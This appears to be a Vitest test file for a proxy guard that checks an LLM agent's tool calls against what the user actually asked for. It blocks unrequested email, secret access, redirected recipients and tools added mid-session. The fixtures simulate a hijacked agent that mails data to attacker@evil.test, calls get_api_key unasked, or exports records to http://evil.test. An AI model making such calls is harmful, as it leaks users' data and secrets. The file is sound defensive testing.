import { describe, expect, it } from 'vitest';
import { guardExchange, ProxyGuardError } from './guardExchange';
import { ProxySession } from './proxySession';

const TOOLS = [
  {
    function: {
      name: 'read_ticket',
      description: 'Read a ticket',
      parameters: { type: 'object', properties: { id: {} } },
    },
  },
  {
    function: {
      name: 'frobnicate_widget',
      description: 'Internal helper',
      parameters: { type: 'object', properties: { id: {} } },
    },
  },
  {
    function: {
      name: 'get_api_key',
      description: 'Returns an integration key',
      parameters: { type: 'object', properties: {} },
    },
  },
  {
    function: {
      name: 'send_email',
      description: 'Send mail',
      parameters: { type: 'object', properties: { to: {}, body: {} } },
    },
  },
];

function request(userRequest: string): unknown {
  return {
    model: 'gpt-oss-20b',
    messages: [{ role: 'user', content: userRequest }],
    tools: TOOLS,
  };
}

function responseCalling(name: string, args: string): unknown {
  return {
    id: 'chatcmpl-1',
    choices: [
      {
        finish_reason: 'tool_calls',
        message: {
          content: null,
          tool_calls: [{ id: 'call_1', function: { name, arguments: args } }],
        },
      },
    ],
  };
}

describe('guardExchange', () => {
  it('blocks a tool the user never authorized', () => {
    const exchange = guardExchange({
      mode: 'ENFORCE',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: responseCalling('send_email', '{"to":"attacker@evil.test"}'),
    });

    expect(exchange.blockedTools).toEqual(['send_email']);
    const decision = exchange.decisions[0];
    expect(decision?.kind).toBe('GUARD');
    if (decision?.kind === 'GUARD' && !decision.decision.allowed) {
      expect(decision.decision.code).toBe('NO_WARRANT_FOR_TOOL');
    }
  });

  it('removes the blocked call from the response the agent receives', () => {
    const exchange = guardExchange({
      mode: 'ENFORCE',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: responseCalling('send_email', '{"to":"attacker@evil.test"}'),
    });

    const response = exchange.response as {
      choices: { message: { content?: string | null; tool_calls?: unknown[] } }[];
    };
    expect(response.choices[0]?.message.tool_calls).toBeUndefined();
    expect(response.choices[0]?.message.content).toContain('send_email');
  });

  it('allows a read the user asked for without any warrant', () => {
    const exchange = guardExchange({
      mode: 'ENFORCE',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: responseCalling('read_ticket', '{"id":"4412"}'),
    });

    expect(exchange.blockedTools).toEqual([]);
    expect(exchange.response).toEqual(responseCalling('read_ticket', '{"id":"4412"}'));
  });

  it('allows an unfamiliar local tool when the call has no outbound reach', () => {
    const exchange = guardExchange({
      mode: 'ENFORCE',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: responseCalling('frobnicate_widget', '{"id":"4412"}'),
    });

    expect(exchange.blockedTools).toEqual([]);
  });

  it('blocks secret access the user never asked for', () => {
    const exchange = guardExchange({
      mode: 'ENFORCE',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: responseCalling('get_api_key', '{}'),
    });

    expect(exchange.blockedTools).toEqual(['get_api_key']);
  });

  it('allows the email the user actually requested', () => {
    const exchange = guardExchange({
      mode: 'ENFORCE',
      rawRequest: request('Email the ticket summary to bob@corp.com'),
      rawResponse: responseCalling(
        'send_email',
        '{"to":"bob@corp.com","body":"summary"}',
      ),
    });

    expect(exchange.authorizedTools).toEqual(['send_email']);
    expect(exchange.blockedTools).toEqual([]);
  });

  it('blocks a redirected recipient even when email was authorized', () => {
    const exchange = guardExchange({
      mode: 'ENFORCE',
      rawRequest: request('Email the ticket summary to bob@corp.com'),
      rawResponse: responseCalling('send_email', '{"to":"attacker@evil.test"}'),
    });

    expect(exchange.blockedTools).toEqual(['send_email']);
    const decision = exchange.decisions[0];
    if (decision?.kind === 'GUARD' && !decision.decision.allowed) {
      expect(decision.decision.code).toBe('PINNED_PARAMETER_CONFLICT');
    }
  });

  it('records without blocking in DETECT_ONLY', () => {
    const raw = responseCalling('send_email', '{"to":"attacker@evil.test"}');
    const exchange = guardExchange({
      mode: 'DETECT_ONLY',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: raw,
    });

    expect(exchange.wouldBlockTools).toEqual(['send_email']);
    expect(exchange.blockedTools).toEqual([]);
    expect(exchange.response).toBe(raw);
  });

  it('blocks a call whose arguments cannot be parsed', () => {
    const exchange = guardExchange({
      mode: 'ENFORCE',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: responseCalling('read_ticket', 'not-json'),
    });

    expect(exchange.blockedTools).toEqual(['read_ticket']);
    expect(exchange.decisions[0]?.kind).toBe('MALFORMED');
  });

  it('fails closed when it cannot read the exchange in ENFORCE', () => {
    expect(() =>
      guardExchange({
        mode: 'ENFORCE',
        rawRequest: request('Summarize ticket 4412'),
        rawResponse: { error: 'upstream rate limited' },
      }),
    ).toThrow(ProxyGuardError);
  });

  it('passes unreadable traffic through in DETECT_ONLY so observation never breaks the agent', () => {
    const raw = { error: 'upstream rate limited' };
    const exchange = guardExchange({
      mode: 'DETECT_ONLY',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: raw,
    });

    expect(exchange.response).toBe(raw);
    expect(exchange.decisions).toEqual([]);
  });

  it('forwards everything untouched when the guard is off', () => {
    const raw = responseCalling('send_email', '{"to":"attacker@evil.test"}');
    const exchange = guardExchange({
      mode: 'OFF',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: raw,
    });

    expect(exchange.response).toBe(raw);
    expect(exchange.decisions).toEqual([]);
  });

  it('blocks a tool that appeared after the session baseline was set', () => {
    const session = new ProxySession();
    const noCalls = { choices: [{ message: { content: 'thinking' } }] };

    guardExchange({
      mode: 'ENFORCE',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: noCalls,
      session,
    });

    const poisonedRequest = {
      model: 'gpt-oss-20b',
      messages: [{ role: 'user', content: 'Summarize ticket 4412' }],
      tools: [
        ...TOOLS,
        {
          function: {
            name: 'read_public_notes',
            description: 'Read notes',
            parameters: { type: 'object', properties: { id: {} } },
          },
        },
      ],
    };

    const exchange = guardExchange({
      mode: 'ENFORCE',
      rawRequest: poisonedRequest,
      rawResponse: responseCalling('read_public_notes', '{"id":"1"}'),
      session,
    });

    // A read-only name earns no exemption when the capability itself arrived late.
    expect(exchange.blockedTools).toEqual(['read_public_notes']);
    expect(exchange.decisions[0]?.kind).toBe('DRIFT');
    expect(exchange.drifts[0]?.kind).toBe('NEW_TOOL');
  });

  it('leaves the original tools usable when another one drifts', () => {
    const session = new ProxySession();
    guardExchange({
      mode: 'ENFORCE',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: { choices: [{ message: { content: 'ok' } }] },
      session,
    });

    const exchange = guardExchange({
      mode: 'ENFORCE',
      rawRequest: {
        model: 'gpt-oss-20b',
        messages: [{ role: 'user', content: 'Summarize ticket 4412' }],
        tools: [
          ...TOOLS,
          {
            function: {
              name: 'export_records',
              parameters: { properties: { url: {} } },
            },
          },
        ],
      },
      rawResponse: responseCalling('read_ticket', '{"id":"4412"}'),
      session,
    });

    expect(exchange.blockedTools).toEqual([]);
    expect(exchange.drifts).toHaveLength(1);
  });

  it('records drift without blocking in DETECT_ONLY', () => {
    const session = new ProxySession();
    guardExchange({
      mode: 'DETECT_ONLY',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: { choices: [{ message: { content: 'ok' } }] },
      session,
    });

    const raw = responseCalling('export_records', '{"url":"http://evil.test"}');
    const exchange = guardExchange({
      mode: 'DETECT_ONLY',
      rawRequest: {
        model: 'gpt-oss-20b',
        messages: [{ role: 'user', content: 'Summarize ticket 4412' }],
        tools: [
          ...TOOLS,
          {
            function: {
              name: 'export_records',
              parameters: { properties: { url: {} } },
            },
          },
        ],
      },
      rawResponse: raw,
      session,
    });

    expect(exchange.wouldBlockTools).toEqual(['export_records']);
    expect(exchange.blockedTools).toEqual([]);
    expect(exchange.response).toBe(raw);
  });

  it('tracks no drift when no session is supplied', () => {
    const exchange = guardExchange({
      mode: 'ENFORCE',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: responseCalling('read_ticket', '{"id":"4412"}'),
    });

    expect(exchange.drifts).toEqual([]);
  });

  it('reports the tiers it inferred so an integrator can correct them', () => {
    const exchange = guardExchange({
      mode: 'DETECT_ONLY',
      rawRequest: request('Summarize ticket 4412'),
      rawResponse: { choices: [{ message: { content: 'done' } }] },
    });

    expect(exchange.classifiedTools.map((tool) => [tool.name, tool.riskTier])).toEqual([
      ['read_ticket', 'READ_ONLY'],
      ['frobnicate_widget', 'READ_ONLY'],
      ['get_api_key', 'SENSITIVE'],
      ['send_email', 'SENSITIVE'],
    ]);
  });
});
